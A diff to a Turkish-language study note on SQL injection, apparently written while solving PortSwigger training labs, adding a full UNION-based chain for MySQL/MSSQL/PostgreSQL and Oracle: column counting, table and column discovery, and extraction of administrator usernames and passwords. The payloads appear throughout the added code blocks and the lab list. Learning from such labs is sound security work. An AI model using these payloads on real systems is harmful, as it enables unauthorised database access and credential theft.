@@ -57,9 +57,15 @@ password: herhangi bir şey
 ## Oracle Özel
 
 ```sql
--- Oracle'da UNION SELECT her zaman FROM ister
+-- Oracle'da UNION SELECT her zaman FROM ister (FROM olmadan hata verir!)
 ' UNION SELECT NULL,NULL FROM dual--
 ' UNION SELECT banner,NULL FROM v$version--
+
+-- Oracle'da tablo keşfi (information_schema YOK)
+' UNION SELECT table_name,NULL FROM all_tables--
+
+-- Oracle'da sütun keşfi
+' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS'--
 ```
 
 ## MySQL Özel
@@ -71,19 +77,67 @@ password: herhangi bir şey
 ' UNION SELECT @@version,NULL#
 ```
 
-## Tablo ve Sütun Keşfi
+## Tablo ve Sütun Keşfi — Tam Zincir
+
+Hedef: tablo adını bilmiyorsun, sütun adlarını bilmiyorsun → hepsini adım adım keşfet.
+
+### Non-Oracle (MySQL / MSSQL / PostgreSQL)
 
 ```sql
--- Tablo isimlerini bul (MySQL/MSSQL/PostgreSQL)
+-- ADIM 1: Sütun sayısını bul
+' ORDER BY 1--
+' ORDER BY 2--
+' ORDER BY 3--   ← hata → 2 sütun
+
+-- ADIM 2: Doğrula
+' UNION SELECT NULL,NULL--
+
+-- ADIM 3: Tablo isimlerini çek
 ' UNION SELECT table_name,NULL FROM information_schema.tables--
+-- → listede "users" veya "users_xxxx" gibi bir tablo ara
 
--- Sütun isimlerini bul
-' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
+-- ADIM 4: O tablonun sütun isimlerini çek
+' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users_xxxx'--
+-- → username_xxx, password_xxx gibi sütunlar çıkacak
 
--- Oracle'da
-' UNION SELECT table_name,NULL FROM all_tables--
-' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS'--
+-- ADIM 5: Veriyi çek
+' UNION SELECT username_xxx,password_xxx FROM users_xxxx--
+-- → administrator'ın şifresini al, giriş yap
 ```
+
+### Oracle
+
+```sql
+-- ADIM 1: Sütun sayısını bul
+' ORDER BY 1--
+' ORDER BY 2--
+' ORDER BY 3--   ← hata → 2 sütun
+
+-- ADIM 2: Doğrula (Oracle'da FROM dual ŞART)
+' UNION SELECT NULL,NULL FROM dual--
+
+-- ADIM 3: Tablo isimlerini çek (information_schema YOK → all_tables)
+' UNION SELECT table_name,NULL FROM all_tables--
+-- → listede "USERS" veya "USERS_XXXX" gibi bir tablo ara
+
+-- ADIM 4: O tablonun sütun isimlerini çek (all_tab_columns)
+' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS_XXXX'--
+-- → USERNAME_XXX, PASSWORD_XXX gibi sütunlar çıkacak
+-- ⚠️ Oracle'da tablo adı BÜYÜK HARF olmalı
+
+-- ADIM 5: Veriyi çek
+' UNION SELECT USERNAME_XXX,PASSWORD_XXX FROM USERS_XXXX--
+-- → administrator'ın şifresini al, giriş yap
+```
+
+### Oracle vs Non-Oracle Karşılaştırma
+
+| Adım | Non-Oracle | Oracle |
+|---|---|---|
+| NULL doğrulama | `UNION SELECT NULL,NULL--` | `UNION SELECT NULL,NULL FROM dual--` |
+| Tablo keşfi | `information_schema.tables` | `all_tables` |
+| Sütun keşfi | `information_schema.columns` | `all_tab_columns` |
+| Tablo adı | küçük harf: `'users'` | BÜYÜK HARF: `'USERS'` |
 
 ## Çözdüğüm PortSwigger Labları
 
@@ -91,6 +145,8 @@ password: herhangi bir şey
 2. Login bypass: `username → administrator'--`
 3. Oracle UNION versiyon: `' UNION SELECT banner,NULL FROM v$version--`
 4. MySQL/MSSQL versiyon: `Gifts' UNION SELECT @@version,NULL-- -`
+5. Non-Oracle DB contents listing: `information_schema.tables` → tablo bul → `information_schema.columns` → sütun bul → veri çek
+6. Oracle DB contents listing: `all_tables` → tablo bul → `all_tab_columns` → sütun bul → veri çek
 
 ## Geliştirici Savunması
 
